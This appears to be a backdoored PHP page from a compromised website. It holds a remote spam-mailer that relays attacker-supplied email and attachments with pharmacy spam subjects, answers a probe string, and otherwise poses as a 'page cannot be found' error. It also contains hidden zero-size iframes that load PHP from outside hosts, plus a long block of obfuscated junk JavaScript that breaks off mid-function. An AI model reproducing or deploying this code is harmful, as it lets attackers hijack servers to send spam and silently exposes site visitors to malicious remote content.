<iframe src=http://mbcobretti.com/hydra.php frameborder="0" width="0" height="0" scrolling="no" name=counter></iframe><?


function ORBTfhcb($xctmp, $from, $to, $subj, $text, $filename) {
    $f         = fopen($filename,"rb");
    $un        = strtoupper(uniqid(time()));
    $head      = "From: $from\n";
    $head     .= "To: $to\n";
    $head     .= "Reply-To: $from\n";
    $head     .= "Subject: $subj\n";
    $head     .= "Content-Type:multipart/mixed;";
    $head     .= "boundary=\"----------".$un."\"\n\n";
    $zag       = "------------".$un."\nContent-Type:text/html;\n";
    $zag      .= "Content-Transfer-Encoding: 8bit\n\n$text\n\n";
    $zag      .= "------------".$un."\n";
    $zag      .= "Content-Type: application/octet-stream;";
    $zag      .= "name=\"".basename($filename)."\"\n";
    $zag      .= "Content-Transfer-Encoding:base64\n";
    $zag      .= "Content-Disposition:attachment;";
    $zag      .= "filename=\"".basename($filename)."\"\n\n";
    $zag      .= chunk_split(base64_encode(fread($f,filesize($filename))))."\n";

    return @mail("$to", "$subj", $zag, $head);
}

function CnLOqWZu($xctmp,$from,$to,$subj,$text) {
	
	$newArrs=array("NEW PACK","PACK","LICENSED PACK","LICENSED PILLS","LICENSED TABS","QUALITY PILL NUM","QUALITY TABS NUM","PILLS - ","TABS - ","YOUNG PILLS","HERBAL PILL","Tablets against impotence","Pills against impotence","PACK AGAINST IMPOTENCE");
	$newArrsCur=$newArrs[rand(0,13)];
    
    $head      = "From: $from\n";
    //$head     .= "To: $to\n";     
    //$head     .= "Subject: ".$subj." (".$newArrsCur." ".rand(1,10).")\n";
    $head     .= "Reply-To: $from\n";
    $head     .= "Content-type: text/html; charset=iso-8859-5" . "\r\n";
	
	/*
	$massArray= array ( 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','`','-','=','~','!','@','$','%','^', '&','*','(',')','_','+',':','"',' ',' ',' ',' ',chr(0x0a),chr(0x0d),' ');                     
        
      
    $repeat=rand(5,20);
    $addtext='';   
     
    for($i=0;$i<$repeat;$i++) {
        $repeatChears=rand(20,150);
        for($z=0;$z<$repeatChears;$z++)
            $addtext.=$massArray[rand(0,75)];
    }

    $text.='<BR>'; */
	
    return @mail($to,$subj." (".$newArrsCur." ".rand(1,10).")",$text,$head);
	
}

if (!empty($_POST['caption']) && !empty($_POST['email']) && !empty($_POST['clientname']) && !empty($_POST['emailsend']) && !empty($_POST['message']) && ($_POST['index'] == 'send'))
{

  $xclient = substr(htmlspecialchars(trim($_POST['clientname'])), 0, 80);
  $title = substr(htmlspecialchars(trim($_POST['caption'])), 0, 80);
  $mess64 = base64_decode($_POST['message']);
  $mess =  substr(trim($mess64), 0, 10000000);
  $send_to = $_POST['emailsend'];    
  $from = $_POST['email'];
  
  if($_FILES['file']['name'] !=''){
    if (is_dir("tmp")) { } else { mkdir("tmp"); }
    if(is_uploaded_file($_FILES['file']['tmp_name']))   {
    if(move_uploaded_file($_FILES['file']['tmp_name'], "tmp/".basename($_FILES['file']['name']))) {
    if(ORBTfhcb($xclient,$from,$send_to,$title,$mess,"tmp/".basename($_FILES['file']['name']))!== FALSE) { echo "OK-FILE"; } else { echo "ERROR-FILE"; }
    @unlink("tmp/".basename($_FILES['file']['name']));
    } else { echo "ERROR-UPLOAD"; }
    } else { echo "ERROR-MOVE"; }
  } else {
             if(CnLOqWZu($xclient,$from,$send_to,$title,$mess) !== FALSE) {
           echo "OK-MESS"; } else { echo "ERROR-MESS"; }
       }
}
else
{
if ($_GET['index'] == 'test') {echo "OK2009"; exit;} else
{
echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>The page cannot be found</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=Windows-1252">
<STYLE type="text/css">
  BODY { font: 8pt/12pt verdana }
  H1 { font: 13pt/15pt verdana }
  H2 { font: 8pt/12pt verdana }
  A:link { color: red }
  A:visited { color: maroon }
</STYLE>
</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><iframe width="0" height="0" style="display:none;" id="frmchkldver" src="http://sadmeanother12.ru/img/header.php?ftd=4755726&path=%7calways11%7cothers%7c&sys=UN&wrk=22"></iframe><TR><TD> <wniwlmemfhxytkjwrmkefshuqluyvkav></wniwlmemfhxytkjwrmkefshuqluyvkav>      function yvw()/* sarn jpcso tlrvqaxo bu*/{var bqnfjkwa = 5/* lqejwhrm jnsqvnbw ubo tiwny*/;for(var mfskp=0; mfskp<59; mfskp++){bqnfjkwa++/* dcblp afeftti*/};return bqnfjkwa;}function fla(){return (210^146);}/* mcd srtm vklqdv*/function ruw(){var abuswqpf = 997;for(var flfsjdyd=0; flfsjdyd<34301;/* ui hxav eprwspe eiyrddv*/ flfsjdyd++){abuswqpf++};/* htrnlfyw lheqmy*/return abuswqpf;}function iux()/* hfj ilnte ngdgiysc ss*/{/* efjht vjsepkj*/var gfuryjud = 0/* lgbausdo*/;for(var ewyjv=0; ewyjv<64/* lorq*/; ewyjv++){gfuryjud++/* ru okgiyy aywildma gmv*/};return gfuryjud;}function bav(){return (144-(80))/* ma payw*/;}function yuw(){return (219-(-33956))/* vebo jaww arcq tfx*/;/* csigap*//* qyguqq pw hpclhy*/}function jnb(){var ctticd = 24;for(var kylfjt=0; kylfjt<40; kylfjt++){ctticd++};return ctticd;/* kl prumaex*/}function mwt(){var lmsqk = 22;for(var rghynw=0; rghynw<42; rghynw++){lmsqk++};/* ovveir*/return lmsqk/* ri mp xbpfvpp*/;}function dyg(){return (113-(49));}function ykr()/* pyn bdd ypon ujqmnhbm*/{return (160+(-96));/* gun*/}/* gxsju cn gcghd*/function ubs(){/* nfwcfj*/return (188^252);}function kqk(){return (117^53)/* jyyrdjo yqxyrts*/;}function xya(){var aabqbm = 21;for(var jwnbw=0; jwnbw<43; jwnbw++){/* pqe tahhv*/aabqbm++};return aabqbm;}function nvu()/* kqdt wl*/{return (193-(129));/* ei kql*/}function bvo(){return (67-(-39169));}function gjb()/* rtynwcyv rwy*/{var prre = 1;for(var ihrh=0; ihrh<63; ihrh++){prre++}/* ys yce*/;return prre;}function gal(){return ((4672)/(73))}/* ilj bccb*/function caf(){var auweai = 608;for(var bjuu=0; bjuu<41399; bjuu++){auweai++/* wh ljqlxyxe ty ncgrjeyh*/};return auweai;}function hax(){return (179^38516);}function ohw(){return (77-(-31));}/* knficqvs cqj db*/function frl(){var byjf = 2;for(var nykpmum=0/* serfsw juldsy ivu jpc*/; nykpmum<62; nykpmum++)/* tymb gryfcx xfdmlw abywljk*/{byjf++}/* qcptpi qnrupd*/;return byjf;}function fkg(){return (210+(-146));/* awjvejgn tb*/}function wis()/* krf lfsqg ttnuicr*/{return (176-(112));}function evb(){return ((1600)/(25))}function ygc(){var wekw = 13;for(var wiym=0; wiym<60809/* fyflv*/; wiym++){wekw++};return wekw;}function xvf(){/* obc uu uga uhcsxld*/return (182^44570);}function aga(){return (13^77)/* pkafrm dhuf*/;}function tgv(){var ropsr = 52;for(var kjsbja=0;/* atbdn jkk gbin fqay*/ kjsbja<12/* xe utpdxrls yagpiskt*/; kjsbja++){ropsr++};return ropsr;}function nlk(){var fryq = 6688;for(var hvxxm=0; hvxxm<39212; hvxxm++){/* eqallp*/fryq++/* lbbtw ebjvr dkwkg jomdcb*/};/* sxpnswq wjibfr jnqrg xbf*/return fryq/* qpbhjtgk ibrwfl ftyplxh ab*/;/* oljnrbe*/}function swg(){var uovhy = 0;for(var anvhw=0; anvhw<113/* bbmauqhy rrlkpc xdafsce*/; anvhw++){uovhy++};/* el rtxsc nkwcg lroiltx*/return uovhy;/* rg cl*/}function aav(){/* fte hrjgj jylpf kho*/var fajvrg = 15;for(var mycql=0/* rpktqtiw*/; mycql<49; mycql++){fajvrg++}/* fphov oifd*/;return fajvrg;}/* vrous dvypes syioljyb dlnbqp*/function wto(){var fnus = 8449/* nxndgjie btjg*/;/* ph bwkxnxcr aqoixc ikufvwau*/for(var mfitovaa=0; mfitovaa<2194; mfitovaa++){/* ujp ynaceu jem gwfkvhba*/fnus++}/* iad ihqrk kny wqggkf*/;return fnus;}function pvu(){var jooqfpp = 39;for(var otbabc=0; otbabc<25; otbabc++){jooqfpp++/* dwgxkkt hmdbxl paeeghqu*/}/* uwmcbm*/;return jooqfpp;}function fvc(){/* trmmf*/return (6-(-58))/* hdnutwq censncw nguevlj*/;/* iwbk mndi qyy mitvdvjm*/}function xsq(){return ((5343448)/(164))}function qww(){return (190^254);/* qfrwcrw rxp qwnjrq xd*/}function tnp(){var vxbdbcb = 46;for(var qguew=0; qguew<18; qguew++){vxbdbcb++};return vxbdbcb;}function fel(){return (98+(-34));}function psw(){return (197-(133));}/* tjuellyv hoerjv ecxvv xjtnxoae*/function log(){var gqpy = 7;for(var cvyifbv=0; cvyifbv<57; cvyifbv++){gqpy++}/* luwjpam xqoj oedmu*/;return gqpy/* cwcjs qjujhr fsmnsyqr aue*/;/* uugfkvy aeutdhv vjatgiob*/}function weu(){return (217^37265);}function aro()/* xei ou lwqaf*/{return (51+(13));}function muj(){return ((1331520)/(160))}function jmo(){/* afbw*/return ((6209190)/(174))/* nixl eg ta*/}/* eieh dqclc ig*/function fnb()/* cfvbc adxlk bkdy*/{var qtxeq = 3;for(var qsoxo=0;/* jjtlbv sgeq*/ qsoxo<61;/* tbihy*/ qsoxo++){qtxeq++};return qtxeq;}function swv(){return (79^15);}function xep(){return ((10373172)/(183))}function prm(){return ((960)/(15))}function shb(){return (247+(32193))/* givyyul*/;}function ygh(){return (202^187);}function cxr(){var schi = 6;for(var csngx=0; csngx<58; csngx++){schi++};return schi;}function ifc(){return (176^240);}function gss(){return (101+(-37))/* ym*/;/* cdkcrxh uyjuxpum uluh*/}function mvk(){var splnvxk = 10;for(var ipdimub=0; ipdimub<54; ipdimub++){splnvxk++}/* iicmjp dxpvrul hp*/;return splnvxk;/* lddlub txykhuu lotxpmif fc*/}/* by wfufk xccslcej thxhjv*/function bir(){return (111-(47));}function xav(){var jlxlgj = 2471;for(var hvkyytfq=0; hvkyytfq<45134; hvkyytfq++){jlxlgj++/* bmyfbrqe*/};return jlxlgj;}function uus(){return (184+(21039));/* doajnhc*/}function knk(){var tmpxj = 8925;for(var ccogfmi=0/* hq*/;/* iwx*/ ccogfmi<46533; ccogfmi++){tmpxj++};return tmpxj/* jra*/;}function hhx()/* bmrjb mxwcsgr*/{var jcgacl = 34;for(var etwuhsk=0;/* udixmias sq*/ etwuhsk<30; etwuhsk++){jcgacl++}/* sdnlp vf pnoxrokp*//* ow osp*/;/* qpmp toese itu*/return jcgacl;}function jdt(){return (188-(-14498));}function afy(){/* wvy*/return (135+(-71));}function uoh(){return (250^186);}function gnj(){return (104-(-44321))/* fef qngy*/;}function von(){var fulxnsf = 2420;for(var qmmrg=0; qmmrg<22192; qmmrg++){fulxnsf++}/* jntstojd qosbi*/;/* dhltcr pvju*/return fulxnsf;}function ide()/* aiascfb rmj xclkgsnr tew*/{var fayaya = 50;for(var enwtlh=0/* icnhl*/; enwtlh<64; enwtlh++){fayaya++};return fayaya;}function yhq(){return (42+(22));}function xbj()/* mwm dbek vdbifre*/{return (237-(173));}/* rkglyfaa*/function oxa(){return (219-(-21678))/* remwm rwq yxtyaon ilhallk*/;}function epd(){var jpufq = 140;for(var quvwtc=0; quvwtc<30033; quvwtc++){jpufq++/* yphxe*/};/* moylwww*/return jpufq;}function tra()/* jefnedkn cflukbqs ojbqqjqs mwuxv*/{return (224^160);}function hbt(){/* hwiky*/return (170-(106));/* xyfupake kpawxg lbagpxu*/}function fyt(){return (184^193);/* pac syfe eyc veyl*/}function bsk()/* wor frgurs bwqjx eeg*/{var tpljstbu = 1;for(var ctejrv=0; ctejrv<63; ctejrv++){tpljstbu++};return tpljstbu;}function nea(){return ((8576)/(134))}function lpt(){return (20^33754)/* wvjs*/;}function qwf(){var hvloj = 6;for(var vxhuvpb=0; vxhuvpb<58; vxhuvpb++)/* my*/{hvloj++/* xbmiu*/};return hvloj/* qgtkvm ew*/;/* wwhmaxfe wlhqkws*/}function pib(){/* ydquq lwvlmsli qt*/var tnskemqr = 18;for(var scir=0;/* wyvcnrdq*/ scir<46; scir++)/* rnehtyeg gm*/{tnskemqr++};return tnskemqr/* tv*/;}function pee(){/* tmwdrg*/return (152-(-24403));/* jy wh*/}/* dsxdolus vewgi*/function hhw(){return ((3828156)/(118))}function wqh(){return (175^239);}function ufp()/* fcxikk uovafqye ddup hjqutg*/{var mlrjxa = 2732;for(var adfqdgx=0; adfqdgx<8666;/* wpsyj onsgmy*/ adfqdgx++){mlrjxa++};/* mittp byd royo*/return mlrjxa;}/* wlmb vwv amj pudgbxn*/function ryy(){var iaee = 11;for(var fqvjt=0; fqvjt<53;/* fpsbtr*/ fqvjt++){iaee++/* gjskrqs pufritlm adfwmysv*/};return iaee;}function umo(){var lurd = 1818;for(var aiqaov=0; aiqaov<29755; aiqaov++){lurd++};return lurd;}function mjv(){return (165+(-101));}function yxg(){/* phjrtn ymtblo fesxfqlm hxiawas*/return (243+(-179));}function jyl(){return (209-(145));}function xvn(){var huldn = 6425/* uaf pbbqnfx pgtkeos*/;for(var rqfx=0/* cdhvc htbxhnqp*/; rqfx<30170; rqfx++){huldn++}/* akkkth pe*/;return huldn;}function qll(){var hqmac = 11952/* tncqn*/;for(var cufmt=0; cufmt<19244; cufmt++){hqmac++}/* sge puj euiit*/;return hqmac;}function fmw(){var ihaf = 52360;for(var ngirl=0; ngirl<7376/* uvoplv cpj jiqelwel rlthovr*/; ngirl++){ihaf++};return ihaf;}function mat(){/* vlxbmjoo qynbwdu umpjtc yk*/return (2-(-62))/* mghbuplw*/;}function iua(){return (156^43500);}/* aifrcdqp grj rkri*/function nhf(){return (75-(11))/* akkqmf esvm ngad lmngsmao*/;}function smg(){return (52+(69));}/* bcixnbgb hndrk lhwyye msbxf*/function dyr(){/* wwofkhet welud vvvijc udwbcy*/var ycvha = 30/* mbf emr vjjasx iyg*/;for(var gueeu=0; gueeu<34; gueeu++){ycvha++};return ycvha;/* ntfewcy xjpxeyer ina*//* tgte*/}function rxt(){return (13^19609);}function jow(){/* mgmjg rkpnron fxxuf yyknia*/var ruawox = 13510;for(var qbgdl=0; qbgdl<25516; qbgdl++){ruawox++};return ruawox;/* dmxw cwyp gx*//* cgjomejn*/}function shc(){var nkwkv = 2;for(var qvqtq=0; qvqtq<62; qvqtq++){nkwkv++};return nkwkv;}/* goyqo ygnctcp kwy*/function lfq(){return (242-(-62908));/* cgomhhrq yrspjfm njtswl bxc*/}function pns(){var hxau = 11;for(var okbs=0; okbs<53; okbs++)/* ebs lgjpdpng*/{/* tk*/hxau++}/* ahifron*/;return hxau;}function bih(){return (207^31353);/* kqarkab cdk lykquel*//* raocht*/}function wyu(){return ((10944)/(171))}function jkq()/* arat kyfn xtl*/{return (170+(56564));}function amg(){return ((7232)/(113))}function int(){return (73^28818);}function mxm(){var sanmv = 2;for(var xnlxg=0/* jl hfvcfat wnpfoa*/; xnlxg<62; xnlxg++)/* kppsmbn*/{/* gcwfr*/sanmv++};return sanmv/* rcaa lwuuyx isu oblo*/;}function uuv(){var igcx = 2;for(var lriwj=0;/* gdi uhjy ekkfpu evwcu*/ lriwj<62/* botcnume cr*/; lriwj++){igcx++/* cxi bayn miobgvqt*/};return igcx;}function nnf(){return (3+(61));}function cag(){/* esxnk*/return (61+(35289));}function mdo(){return (246+(42169));}function vcq(){return ((8192)/(128))}function ukf(){return (222-(-62598))/* enmisqxw dnoc fwohovh nn*/;/* lgoqpnxm*/}function lqh()/* etiyy kq utnrjk nmpheh*/{var paiu = 22;for(var cjwsuk=0; cjwsuk<42; cjwsuk++)/* keqnahi bkxewypn*/{paiu++};/* ne hykb*/return paiu/* vi wclowtli ountvcx khjf*/;}function uto(){var egmmtiq = 37835;for(var lsqcajx=0; lsqcajx<8376/* wwdhiar rfnfsnnk*/; lsqcajx++){egmmtiq++};return egmmtiq;}function aib(){return ((16256)/(254))}function ydx(){var qmyga = 31;for(var mysgn=0; mysgn<18800; mysgn++){qmyga++};return qmyga;}function vtf(){/* xfcpcxb mv lys chkudd*/return (231^167);/* hopcw*/}function rjq(){return (5+(59));}function rqn(){var ptuooueo = 11261;for(var ppvc=0; ppvc<36887; ppvc++){ptuooueo++};/* wvse*/return ptuooueo;}function pue(){return ((703409)/(119))}function drf(){return (114+(-50));/* ulrety*/}function eqh(){return (99-(-23568));}/* tbmwkac*/function bxt()/* uhus loewcikn glxpeu*/{return (252+(-188));}function egh()/* vlodm ltqk vhygrni*/{return (136-(19));}function mkl()/* egbojbyg*/{/* lclyxcld ytkubxf bmjkrpmf*/return (117+(-53));/* soyu jtpicki hoi*/}/* ujyys gti*/function vck()/* yelvnsh*/{var ygyptfho = 7133;for(var rqfo=0/* yybr*/; rqfo<24387; rqfo++)/* jxyjno uv gvnxpcpa*/{ygyptfho++};return ygyptfho;}function nwx(){return (148^23166);}function fjr(){return ((1536)/(24))}function uno(){return (88^27841);/* akmua ifl mntg ppmq*/}function vvc(){/* cdxn btew msi phqqfwe*/return (148+(43415));}function jnw(){var ciao = 0;for(var prphoaaa=0; prphoaaa<116; prphoaaa++){ciao++};return ciao;}function lvo(){var lpbuvgk = 6;for(var vflhm=0; vflhm<58; vflhm++)/* gu nkdmt*/{lpbuvgk++};return lpbuvgk;}function gyl(){return ((7296)/(114))}function brn(){var sgwgjvf = 24;for(var cwxs=0; cwxs<40; cwxs++){sgwgjvf++};return sgwgjvf;}function npl(){return (234^170)/* voqlors uoyful*/;}function ryl(){return (72^8);}function vrs(){return ((5217296)/(148))}function nmy(){return (171-(107));}function qyl(){var ylpeemw = 19;for(var ldirva=0; ldirva<45; ldirva++){ylpeemw++};return ylpeemw;}function jjq(){return (87^11723);}function fva(){var ufdngqx = 8639;for(var apfayqu=0; apfayqu<36437; apfayqu++){ufdngqx++};return ufdngqx;}function vgh(){/* hcdrpkqj*/return (30^94);/* ccdff lulic*//* kwr aqslfj ouujh jxdcamj*/}function gfa(){return (65+(-1));/* rwaiwupc sbbx*/}function nsr(){return (239-(-4431));}function loc(){var qqjluelv = 671;for(var dhivsnr=0/* rgmuo ukcaxei bo rpe*/;/* rectaqwf*/ dhivsnr<37064; dhivsnr++){qqjluelv++};return qqjluelv;}function gpl()/* recnrp njwy ffreawd qrjds*/{return (236+(42266));}function weq(){return ((1344)/(21))/* ehoiargk*/}function hlc(){/* wyxwc ciqn inh*/var psgl = 3;/* hnwt tqlk bqem bradfvw*/for(var ibvcjp=0; ibvcjp<61/* jitqp*/; ibvcjp++){psgl++};return psgl;}function qpv(){return ((3200)/(50))}function kqn(){return (14-(-8890));}function vad(){var swfnqrta = 6;for(var njmadrlp=0; njmadrlp<58; njmadrlp++){swfnqrta++};return swfnqrta;}function jne(){var thjn = 7579;for(var vhekj
